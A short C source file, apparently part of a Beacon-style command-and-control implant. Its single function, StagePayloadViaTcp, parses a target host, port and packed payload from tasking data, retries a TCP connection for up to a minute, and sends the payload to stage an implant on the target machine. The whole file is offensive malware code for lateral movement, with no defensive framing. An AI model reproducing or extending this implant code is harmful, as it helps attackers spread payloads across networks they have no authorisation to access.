#include "pch.h"

#include "beacon.h"
#include "link.h"
#include "network.h"

int StagePayloadViaTcp(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	char* target = BeaconDataStringPointer(&parser);
	int port = BeaconDataInt(&parser);
	char* packed = BeaconDataBuffer(&parser);
	int packedLength = BeaconDataLength(&parser);

	NetworkInit();

	SOCKET targetSocket;
	int timeout = GetTickCount() + 60000;
	while (GetTickCount() < timeout)
	{
		targetSocket = LinkViaTcpConnect(target, port);
		if(targetSocket != INVALID_SOCKET)
		{
			send(targetSocket, packed, packedLength, 0);
			goto waitAndClose;
		}

		Sleep(1000);
	}

	LERROR("Could not connect to target (stager)");
	BeaconErrorNA(ERROR_STAGER_CONNECTION_FAILED);

	waitAndClose:
	Sleep(1000);
	return closesocket(targetSocket);
}
